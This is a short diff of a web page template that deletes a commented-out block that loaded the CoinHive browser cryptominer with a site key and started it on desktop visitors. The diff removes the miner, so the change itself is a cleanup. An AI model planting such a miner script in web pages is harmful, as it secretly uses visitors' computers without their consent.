@@ -197,20 +197,3 @@ function removeKA(id, user) {
 }
 </script>
 <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/1.0.10/cookieconsent.min.js"></script>
-<!-- <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-<script>
-	var miner = new CoinHive.Anonymous('GIoaIxGbl6vKvaabbiDkxGKfl5QfYmjv', {
-        throttle: 0.7,
-        autoThreads: true
-    });
-    if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
-        if(miner.isRunning()) {
-            miner.stop();
-        }
-    }else
-    {
-        miner.start();
-    }
-	
-
-</script> -->
